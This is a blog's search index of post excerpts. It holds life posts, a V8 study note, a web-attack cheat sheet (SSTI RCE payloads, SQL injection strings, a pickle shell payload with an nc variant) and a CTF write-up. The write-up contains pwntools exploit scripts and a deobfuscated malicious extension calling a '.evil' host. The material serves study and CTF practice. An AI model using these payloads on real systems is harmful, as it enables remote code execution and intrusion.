var store = [{
        "title": "Start Again",
        "excerpt":"My fourth github blog start 🎇   Using jekyll again ✨   And it can be set easily~ 🎃   This formula $f(x) = x^2$ is an example.   $$ \\lim_{x\\to 0}{\\frac{e^x-1}{2x}} \\overset{\\left[\\frac{0}{0}\\right]}{\\underset{\\mathrm{H}}{=}} \\lim_{x\\to 0}{\\frac{e^x}{2}}={\\frac{1}{2}} $$  $$ \\begin{aligned}  a^2 + b^2 &= c^2 \\\\  E &= M \\cdot C^2 \\\\  &= xy + \\mathbb{E}  \\end{aligned} $$  minimal-mistakes theme is better to expose my thoughts ordered by my favorites  ","categories": ["life"],
        "tags": ["hello","world"],
        "url": "/life/start-again/",
        "teaser": null
      },{
        "title": "web note (update 2021.10.27)",
        "excerpt":"post will be frequently updated   SSTI (Server Side Template Injection)  해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다.  This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.   ▶ jinja2  # 기본 {{ 4*4 }} =&gt; 16  # check with config {{ config }} {{ config.items() }} {{ config['secret_key'] }}  # RCE with config {{ config.__class__.__init__.__globals__['os'].popen(\"ls\").read() }} {{ (config|attr(\"__class__\")).__init__.__globals__['os'].popen('cat flag').read() }}  # etc ('',(),get_flashed_messages, url_for, ...) {{ ''.__class__.__mro__[1].__subclasses__()[**index**]('cat flag', shell=True, stdout=-1).communicate() }} {{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read() }} {{ url_for.__globals__.__builtins__.eval('__import__(\"os\").popen(\"ls -al\").read()') }}   # with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회 http://foo.bar/?payload={{ request|attr('class')|attr(request.args.get('mro'))|attr(request.args.get('getitem'))(1) }}&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__ {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}       SQLI (sql injection)  해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.  The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.   1. Comment symbol     /* ~ */, -- ~, # (URL encoded : %23)   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1=1-- \" =&gt; Select * from tbl where id='' or 1=1--' user_input=\"' or 1=1#\" =&gt; Select * from tbl where id='' or 1=1# user_input=\"' or 1=1/*1234*/\" =&gt; Select * from tbl where id='' or 1=1/*1234*/' ...? (must have closed symbol)   2. with single quarter     id가 ''로 감싸져 있을 경우 '를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.   -- example. Select * from tbl where id='(user_input)'  -- Select ALL query from tbl user_input=\"' or 1='1\" =&gt; Select * from tbl where id='' or 1='1'   3. and, or, &amp;&amp;, ||, in, between, like  -- and, or Select * from tbl where id='1234' and pw='5678' Select * from tbl where id='1234' or pw='5678'  -- &amp;&amp;, || (no space required) Select * from tbl where id='1234'&amp;&amp;pw='5678' Select * from tbl where id='1234'||pw='5678'  -- in Select * from tbl where id in '1234' and pw in '5678'  -- between and (both number and char are possible) Select * from tbl where age between 20 and 30 -- 20&lt;=age&lt;=30 Select * from tbl where score between 'A' and 'C' -- 'A'&lt;=score&lt;='C'  --like (starts with ~, ends with ~, include ~, length) Select * from tbl where name like 'Bae%' -- starts with Bae Select * from tbl where name like '%uk' -- ends with uk Select * from tbl where name like '%won%' -- include won Select * from tbl where name like '___' -- length 3 chars Select * from tbl where binary name like '~' -- distinguish upper/lower   4. Internal function in mysql     char(...) : change integer arguments to char (ex. char(0x61,0x62,0x63)=&gt;\"abc\")   mid/substr[ing](a,b,c) : get c bytes in a from b(starts from 1 ~ ..)   left(a,b) / right(a,b) : get b bytes in a (begin / end(reverse but print correctly))   version() : get mysql version   database() : get current database       python pickle deserialization  pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loads 함수에서 unpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다.   import os import pickle  class payload(object):   def __reduce__(self):     #return (os.system, ('ls', ))     #return (os.system, ('cat flag', ))     return (os.system, ('/bin/sh', ))     #return (os.system, ('/bin/sh | nc [ip] [port]', ))  pickle_d=pickle.dumps(payload()) pickle.loads(pickle_d) # get shell anyway  $ id uid=1000(test) gid=1000(test) groups=1000(test)   update 예정.  ","categories": ["note"],
        "tags": [],
        "url": "/note/web-note-update/",
        "teaser": null
      },{
        "title": "Personal R&D plan beginning from 'now'",
        "excerpt":"UPDATED : 19 JUL 2024 13:00 UTC+9 KST That would be LAST UPDATE, Let’s plan more!   This is my plan to be finished until/after graduating.   Research     § must be finished until new year’s day §         Kernel : Dirty Cow Analysis (CVE-2016-5195) -Complete     Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete      Develop     § new year STUDY plan §         Making interpreter/compiler with Rust (With Chris Ohk, ..) s       Goal                 Try something “new”, Try Everything         Pass any awesome Univ.’s admission (Complete)         Pass drive license (Complete)         Dreamhack Wargame 1st                        Format Sniper (Learn &amp; Analyze about FSB, Solved :D)             Dreamcurl (Rev O, Crypto X. So learn mathematics!, Solved :D)             Unibitmap (Solved :D)             dreamboard v2 (V8 : Solved :D)                             Purchase another laptop (DELL XPS 15 12th generation Intel CPU)         BoB (Best of the Best) 14th? 15th?         Try to be the BEST without competitive mind, Just enjoy                 ","categories": ["life"],
        "tags": [],
        "url": "/life/list-after-graduate/",
        "teaser": null
      },{
        "title": "[V8 Study] 00-introduction",
        "excerpt":"[!] 우선적으로 한글로 작성하여 추후 번역할 예정.   Summary  우리가 대중적으로 사용하는 Google Chrome browser에는 웹페이지를 동적으로 실행시키기 위해 javascript가 구동될 수 있도록 지원하고 있다. 그렇다면, JS를 원활하게 실행하고 컴파일하는 역할은 어떤 것이 맡고 있을까? 이 챕터에서는 내가 공부했던 chromium javascript engine인 V8에 대해서 알아보고자 한다.   V8의 구조는 어떻게 되어 있을까?   V8같은 경우 Chrome 구동 시 하나의 프로세스로 실행되어 heap 및 stack 메모리 영역을 관리하면서 Javascript의 각종 변수와 메소드를 실행하는 가장 핵심적인 execution file로 동작한다. 이외에 Task/Callback queue, Microtask queue, WebAPI 등 다양한 요소가 Chromium browser를 구성하고 동작하는데 사용된다.   가장 대표적인 역할은 javascript 코드를 컴파일된 컴퓨터에 최적화된 코드로 변환시켜 전달하게 된다는 것이다. 이때 JIT(Just-In-Time) Compiler라는 독창적인 컴파일러를 사용한다.   V8만의 특징은 무엇이 있을까?     우선 인터프리터와 컴파일러에 대해 알아야 할 것이다.     인터프리터            장점 : 한 줄 한 줄 변환하기 때문에 실행 속도가 빠르다.       단점 : 자바스크립트 코드가 복잡해질수록 점점 속도가 느려진다. 예를 들어, 같은 코드를 여러차례 반복하는 반복문의 경우, 같은 결과를 반복하는 것임에도 불구하고 코드를 한 줄 한 줄 읽는 방식에 의해 그때그때 실행된다.           컴파일러            장점 : 파일 전체를 한번에 읽어서 컴파일러는 작업을 단순화시킨다. 예를 들어 특정 함수를 10억번 반복해야 할 경우, 컴파일 과정에서 함수를 반복하는 것이 아니라 함수의 결과물을 반복하도록 컴파일 한다. 이처럼 불필요한 동작을 제거하는 컴파일러의 방식을 최적화, optimization이라고 한다.  (인터프리터는 optimize하지 않는다 )       단점 : 코드를 바로 실행하지 않고, 코드 실행 전 전체를 컴파일 하는 과정이 필요하기 때문에 초기에 속도가 느릴 수 밖에 없다.           자바스크립트 엔진의 내부를 공부하다가 잠시 인터프리터와 컴파일러의 간단한 개념과 장단점을 짚어봤다. 그러면 과연 V8 엔진은 어떤 방식을 취했길래 다른 자바스크립트 엔진보다 더 빠르고 효율적으로 자바스크립트 명령을 수행할 수 있을까? 바로 여기에서 V8 엔진의 독특한 언어 변환 도구인 JIT Compiler가 들어온다. JIT은 Just In Time의 약자이다.   JIT Compiler의 구조     V8 엔진은 다음과 같은 구조로 되어 있다.     Parser : 코드를 Lexical Analysis라는 과정을 통해 토큰으로 분해한다.   AST(Abstract Syntax Tree) : Parser에서 분해된 토큰을 바탕으로 추상적인 트리를 생성한다.   Ignition : AST에서 나온 트리를 V8의 인터프리터인 ignition에게 전달하고 이것을 인터프리터는 bytecode로 변환시킨다. (High-level Lang to Low-level Lang)   TurboFan, Profiler : bytecode를 실행하여 Human-readable Lang을 실행시키고, 그중 자주 사용되는 코드라고 판별된 코드 조각은 TurboFan으로 보내져 최적화를 수행하여 새로운 컴파일된 코드로 재구성된다. (이때 자주 사용되는 코드라는 말이 매우 추상적이므로 Profiler 라는 친구한테 사용 빈도 수 등을 수집하게끔 역할을 부여하고, 모인 데이터를 통해 Turbofan의 알고리즘대로 최적화를 한다)   Turbofan은 어떤 조건으로 최적화하는 걸까?          코드가 뜨겁고 안정적인 것, 쉽게 말하면 자주 호출되고(뜨겁고) 코드가 안 변함(안정적)이라는 것이다. 매번 같은 행동을 수행하는 반복문 내에 있는 코드 같은 경우가 여기에 해당하기 쉽다.            인터프리팅된 바이트 코드의 길이를 보고 특정 임계점을 넘기지 않으면 작은 함수라고 판단해서 최적화를 진행하는 것이다. 작고 단순한 함수는 크고 복잡한 함수보다 동작이 매우 추상적이거나 제한적인 확률이 높기 때문에 안정적이라고 볼 수 있다.       [!] 그러나, 컴파일러는 100% 완벽하지 못하기 때문에 의도와 다르게 발적화(deoptimization)가 일어날 수도 있다.   Next Topic  다음에는 V8에서 자료형이나 JS의 다양한 메소드가 어떤 식으로 저장이 되고 불러올 수 있는지를 알아보고자 한다.   reference     https://dkwjdi.tistory.com/194   https://github.com/danbev/learning-v8/blob/master/notes/intro.md  ","categories": ["note"],
        "tags": [],
        "url": "/note/V8-introduction/",
        "teaser": null
      },{
        "title": "CTF Write-up [test]",
        "excerpt":"Summary  Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic.  pwn focused on FSB attack or ezpz kernel exploitation.  RSA, elgamel simple attack in crypto. and etc..   Tasks      Pwnable💻            Payback       Insider       OpenDoor           Cryptography💡            BBGun06 (+ revenge)       ElElGamal           Reversing⚙️            BreakOut       ChromeMiner, Assisted           Forensic🔎            Lina’s Invitation           PWN : Payback   1. Analyze  mitigations are here:  [*] '/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled     RUNPATH:  b'./.glibc/'  I found that delete_bot function has Format string bug when I send delete_reason.  int delete_bot() {     unsigned int id;     id = getId(); // 0 ~ 31     if (botBuf[id].url != NULL)     {         char reasonbuf[MAX_REASON_SIZE];         memset(reasonbuf, '\\x00', MAX_REASON_SIZE);         // gather statistics         printf(\"\\n[*] Enter the reason of deletion: \");         read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1);         free(botBuf[id].url);         botBuf[id].url = NULL;         puts(\"\\n[+] Bot Deleted successfully! | Reason: \");         printf(reasonbuf);         return 0;     }     puts(\"\\n[!] Error: Unable to fetch the requested bot entry.\\n\"); }  reasonbuf is in a stack area so I can check FSB attack offset with input buffer.  If I manage __free_hook, I can call system(\"/bin/sh\\x00\") when I call delete_bot.  Setting bot’s URL to /bin/sh\\x00 and calling free can trigger shell.  Let’s exploit!   2. Exploit Code  from pwn import *  # p=process(\"./payback\") p=remote(\"142.93.37.110\",30669) e=ELF(\"./payback\") l=ELF(\".glibc/libc.so.6\")  def add():     p.sendlineafter(\"&gt;&gt; \", str(1).encode())     p.sendlineafter(\": \", \"/bin/sh\\x00\")     p.sendlineafter(\": \", \"0\")  def delete(id, fsb_pay):     p.sendlineafter(\"&gt;&gt; \", str(3))     p.sendlineafter(\": \", str(id))     pause()     p.sendafter(\": \", fsb_pay)  add() delete(0, \"%p\") # overwrite offset : 8  p.recvuntil(\"Reason: \\n\") libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym['__free_hook'] system = libc_base + l.sym['system']  log.info(hex(libc_base)) log.info(hex(free_hook))  add()  low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32  if mid &gt; low:     rmid = mid-low else:     rmid = 0x10000+mid-low  if high &gt; mid:     rhigh = high-mid else:     rhigh = 0x10000+high-mid  log.info(hex(low)) log.info(hex(mid)) log.info(hex(high))  payload = '' payload += '%{}c'.format(low) payload += '%13$hn' payload += '%{}c'.format(rmid) payload += '%14$hn' payload += '%{}c'.format(rhigh) payload += '%15$hn' payload += 'A' payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4)  delete(0, payload)  add() delete(0, b\"pwned\")  p.interactive()     Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}.     PWN : Insider   1. Analyze  Binary run FTP cli program with 30 commands.     USER ;) : compare with ;) string, if it’s correct, prepare PASS command.   PASS ;) : same with USER command, if password correct, I can use all of cmds.   BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition.   LIST : get current working directory (CWD) by using getcwd() function.  also run ls -al [result of getcwd()] with popen.  if process run successfully, result should be written in console.   CWD [path] : change working directory with my own path.   MKDR [path] : make directory with my own path.   .. etc   BKDR command can leak stack area or overwrite stack area.  I found unchanged stack position that makes denied access to LIST command.  (value : -1, LIST NOT ALLOWED!)   at first, I used RETR command to read /flag.txt, but this file’s permission is only read in root, r--------. Need to find another way..      v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n.   2. After Getting shell..?     MKDR ;sh : make directory named ;sh. it’s legal expression in linux.   CWD ;sh : change working directory to /home/ctf/;sh   LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!!   In the shell, cd /home/ctf =&gt; I noticed that get_flag file’s RUNPATH is ./, so changing working directory to /home/ctf is necessary.   In the shell, ./get_flag =&gt; Execute!   In the shell, exit =&gt; for receiving results of entire commands.  (because commands is running in popen process)   3. Exploit Code  from pwn import *  #context.log_level = 'debug'  p = remote(\"104.248.175.153\",30467) #p = process('./chall')  def qwer(x, noRecv=False):         if not noRecv:  p.recv()         p.send(x)         sleep(0.5)  qwer(\"USER ;)\") qwer(\"PASS ;)\")  qwer(\"BKDR %p %p %p %p %p %p %p\") p.recvuntil(\"(nil) 0x\") leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak))  pay = b'BKDR' pay += b' %1035$n'  #pause() pay = pay.ljust(0x28-3, b'b') pay += p64(leak) pay += b\"ASDF\" qwer(pay)  #qwer(\"STOR .profile\") #qwer(\"alias ls='sh;ls'\".ljust(0x1000, 'a') + 'LIST', True) #p.shutdown('send')  qwer(\"MKDR ;sh\") qwer(\"CWD ;sh\") qwer(\"LIST\")  p.sendline(\"cd /home/ctf\") p.sendline(\"./get_flag\") p.sendline(\"exit\") p.interactive()   Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}.     PWN : OpenDoor  ! REDACTED !  Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb     CRYPTO : BBGun06  1. Analyze   BBGun06 / revenge has same verify(self,message, signature) code:  def verify(self, message, signature):         keylength = len(long_to_bytes(self.n))         decrypted = self.encrypt(signature)         clearsig = decrypted.to_bytes(keylength, \"big\")          r = re.compile(b'\\x00\\x01\\xff+?\\x00(.{15})(.{20})', re.DOTALL)         m = r.match(clearsig)          if not m:             raise VerificationError('Verification failed')          if m.group(1) != self.asn1:             raise VerificationError('Verification failed')          if m.group(2) != sha1(message).digest():             raise VerificationError('Verification failed')          return True   And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer.  Decrypted message is same when I give bytes string that has same integer result. That means, dec(\"0001\") == dec(\"01\"). It’s simple!  send given signature with 00 :D, 00 + sig  revenge prob has the same solving process lol:) See below.  2. Exploit (Manual)  // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10  ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32'06_519n47u23_f02932y}  signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f  ...  Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32's}     CRYPTO : ElElGamal  I didn’t know about ElGamal in cryptography, so I searched a lot.  writing… —   REV : BreakOut   1. FLAG Recovering     Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running!   Download bkd file in website.   Realize it’s web server made by C++.   Find secretGet function and get flag.   2. Get FLAG     Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}.     REV : ChromeMiner   Fully obfuscated js Challenge.   1. Recover with hand  async function iF() {   if (!('injected' in document)) {     document['injected'] = true;     window['setInterval'](async () =&gt; {       y = new window['Uint8Array'](64);       window['crypto']['getRandomValues'](y);       if (new window['TextDecoder']('utf-8')['decode'](await window['crypto']['subtle']['digest']('sha-256', y))['endsWith']('chrome')) {         j = new window['Uint8Array'](y['byteLength'] + (await window['crypto']['subtle']['digest']('sha-256', y))['byteLength']);         j['set'](new window['Uint8Array'](y), 0);         j['set'](new window['Uint8Array'](await window['crypto']['subtle']['digest']('sha-256', y)), y['byteLength']);         window['fetch']('hxxps://qwertzuiop123.evil/' +          [...new window['Uint8Array'](await window['crypto']['subtle']['encrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', await window['crypto']['subtle']['decrypt']({['name']: 'AES-CBC', ['iv']: new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_')}, await window['crypto']['subtle']['importKey']('raw', new window['TextEncoder']('utf-8')['encode']('_NOT_THE_SECRET_'), {['name']: 'AES-CBC'}, true, ['decrypt']), new window['Uint8Array'](('E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8')['match'](/../g)['map'](h =&gt; window['parseInt'](h, 16)))), {['name']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x =&gt; x['toString'](16)['padStart'](2, \"0\"))['join'](\"\"));       }     }, 1);   } } ;  chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) =&gt; {   if ('url' in tab &amp;&amp; tab['url'] != null &amp;&amp; (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) {     chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF});   } });   2. Decrypt with AES-256  &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &gt;&gt;&gt; cipher.decrypt(b'\\xe2B\\xe6Ba\\xd2\\x19i\\xf6[\\xed\\xf9T\\x90\\n\\x99R\\t\\t\\x9f\\xb6\\xc3\\xc6\\x82\\xc0\\xd9\\xc4\\xb2u\\xb1\\xc2\\x12\\xbc\\x18\\x8e\\x08\\x82\\xb6\\xber\\xc7I!\\x12A\\x18\\x7f\\xa8') b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10'     FOR : Lina’s Invitation  writing….  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/ctf_test/",
        "teaser": null
      },{
        "title": "근황",
        "excerpt":"시작하기 전에..  블로그 활용을 너무 안 하는 거 같아서.. 티스토리도 슬슬 어떤 내용으로 채워야 할지 모르겠습니다..  어느정도 업무도 막바지를 달리고 있기에 메인 블로그에 그동안 기록하지 못했던 기술적인 내용과 나에 관한 이야기를 자주 적어보려고 합니다.  며칠 안 남았지만 아직도 고생하는 저를 위해 따뜻한 한마디 남겨주시고 가주시면 감사하겠습니다.   본론  꾸준한 CTF 참여도 좋긴 하지만 한 번쯤 내 이야기를 적어보고 싶다는 생각에 과감히 시간을 들이게 되었다.   D-700에서부터 시작한 복무가 100일도 남지 않았다.  지금에서야 돌아보면 정말 많은 일이 있었지만, 묵묵히 하나하나씩 해결하다 보니 여기까지 오게 되었다.   1년 반 정도의 복무기간이 지나고 나서 나의 지식의 폭과 대처능력이 긍정적으로 바뀌는 것을 몸소 느끼게 되었다. 그렇지만 여기까지의 과정은 롤러코스터처럼 다사다난했다.  초반에 학교만 다니다 회사에 매일매일 다니게 되었을 때에는 항상 이런 생각부터 했다.   “대체 내가 남들보다 잘하는 것이 뭐지? CTF 잘한다고 회사일 잘하는 것도 아니고..”  “항상 뭐든지 찍먹하던 애매한 애가 이런 고민 하면서 하루하루 버텨가는 게 무슨 소용이 있지?”   항상 가까이 있는 사람과 비교해가면서 사는 하루하루는 나를 부정적인 생각으로 가득차게 만들기에 충분했다. 그리고 갈팡질팡하는 시간이 너무 많아지다보니 점점 정신적으로 피폐해져갔다. 회사에서 어린 나이에 일하면서 감정적으로 사람을 대한 적도 있고, 집에 와서 제대로 대처도 못하는 나 자신에게 한탄하면서 울 때도 있었고, 부모님과 통화하면서 몇 시간을 내가 겪었던 이야기들로 채운 적도 있었다.   그렇지만 나를 어떻게든 일으켜줬던 사람들도 있었다. 항상 퇴근하고 나서의 공허한 시간을 대화를 통해 채워줬던 형들도 있고, 서울에 와서 취미도 제대로 못 챙기던 나에게 옆에서 조언해주신 몇몇 회사 분들 덕분에 지금까지 버틸 수 있었다고 생각한다. 솔직히 말하면 그분들은 지금은 대부분 근처에 계시지 않는다.   여기에 와서 나를 제일 힘들게 한 것은 “어떤 행동을 하든 말을 하든 눈치가 보이는 환경”이다. 이런 시간도 아껴서 살아가야 할 시간에 남 눈치를 보고 있으니 내 의지를 꾸준히 보여주는건 어려운 일이었다. 적어도 2023년은 나에게 이 문제로 지옥 같은 시간을 보냈다. 싫어하는걸 티 내지도 못하고 그저 난 내 앞 모니터만을 바라보면서 이렇게 조금씩 역량을 채워나가면 어떻게든 이 힘든 시간이 지나가겠지 하면서..   한편으로는 사회생활을 하면서 내가 고쳐야 할 점이 있다는 생각이 들었다. 언제는 스스로 내 화법이 마음에 안 들고 고치고 싶다는 마음에 집 앞 서점에 가서 ‘사회생활 중 말을 조리 있게 하는 방법’에 대한 책을 직접 찾아 읽었다. 그중에 가장 마음에 들었던 대처 방법이 있었다. 구체적이고 개연성 있게 말하는 습관을 들이는 것은 인간관계에서 오해를 줄이는 방법이라는 것이다. 이때부터 난 내가 가지고 있는 배경지식을 먼저 설명하고 하고 싶은 말을 하는 사람으로 변화하게 되었다.   그치만 이게 마냥 좋은 것만은 아닌 것 같았다. 상대방의 수준에 맞추어 말하기는 정말로 쉽지 않은 일이고, 내가 가지고 있는 지식보다 한참 아래의 이야기도 곁들여 하는 게 너무 어려웠다. 결국, 이후에는 남에게 내 의견을 이야기하지 않는 상황에까지 이르렀다. 2023년 연말에는 정말 쥐죽은 듯 나 자신을 지키자는 마인드로 하루하루를 버텼던 것 같다. 그리고 힘들었던 점과 스트레스 문제는 뒤에서 소중한 사람들과 풀거나 게임을 하는 걸로 풀었다.   한바탕 소동이 있고 나서 2024년을 맞이하게 되었다.   나는 갑자기 팀 안에서 내 프로젝트를 메인으로 담당하는 유일한 사람이 되었다.   2023년에는 그래도 권위 있는 분의 도움으로 어떻게든 마무리를 지었으나, 올해는 더는 내 분야를 전적으로 도와줄 수 있는 사람이 없었다. 철저히 혼자가 되었다는 느낌을 받았다. 2024년 프로젝트 계획을 들었을 땐 미치도록 올라간 업무 난이도에 의지할 사람은 팀장님밖에 없으니 앞길이 너무나도 막막했었다. 그렇다고 해서 이런 상황 속에서도 사람들과 외적으로 잘 지내는 능력이 없으니 하루하루 일-집 반복만 하면서 스스로 벽을 세웠고 나에게 긍정적인 것들로만 주변 환경을 채우는 데 급급했다.   .. 이런 시간이 많아져서 그럴까. 점점 대규모의 코드 조각들을 이해하고 연관 짓는 속도가 빨라졌고 이슈를 해결하는 역량도 뛰어나게 높아졌다. 이는 작년에는 경험상으로 나갔던 대회들이 많았던 반면 올해 다시 참여한 CTF들의 성적과 나의 역할이 생각보다 중요해진 것에서도 드러났다. 여기서 정말 자신감을 많이 얻었던 게 그 전까지는 내 포지션이 무엇이었는지 특정하기 힘들었지만, 지금은 확실하게 Browser Research, exploit에 미친 사람이 된 것을 체감하고 있다. 그렇기에 업무에 애정을 지금까지도 잃지 않고 있게 된 것이다. 정말 다행인 점이다. 그렇지만 기술적인 역량이 늘어나면서 내면은 죽어가고 있었다. 이런데도 어느 집단은 우리가 뭘 원하는지 전혀 알아주지 못하는 것 같다. 아니, 아는데도 무시하는 걸까?   혼자인 상황이 그리 달갑지만은 않다. 사람들을 만나는 걸 얼마나 좋아하는 나인데.. 언제까지 이렇게 나를 가두면서 살아야 할까 싶다. 며칠 뒤면 학교에 돌아가는데, 신입생 때 했던 내 행동과 마음가짐을 생각해보면 그렇지 않은 사람처럼 보였을 것 같아 참 아쉽다. 이것이 요즈음 나 자신을 가꾸어야 한다고 생각했던 이유 중 하나기도 하다. 공부 잘해봤자, 해킹 잘해봤자, 사실 행복한 사람으로 보이려면 주변 사람들부터 챙기고 해야 되는 건데 우선순위를 이제는 좀 바꿔도 되지 않을까 싶다.   올해 프로젝트도 이제 막바지다..  남은 3개월은 앞으로의 여정을 어떻게 그려나갈지에 대해 고민하는 시간으로 보낼듯하다.      내가 학교생활에서 놓친 게 무엇이었는지..  조금 더 나은 주말을 보내기 위해서 어떻게 할지..  내가 어렸을 때부터 좋아하던 취미를 서울에서 어떻게 다시 실현할지..    이러다 보면 어느샌가 더 나은 사람이 되어 있지 않을까?   지금까지 고생한 나에게 그동안 수고했다고 말해주고 싶다.  그리고 나 자신을 비롯한 소중한 사람들에게도 행복한 일들만 가득했으면 좋겠다.  ","categories": ["life"],
        "tags": [],
        "url": "/life/%EA%B7%BC%ED%99%A9/",
        "teaser": null
      }]
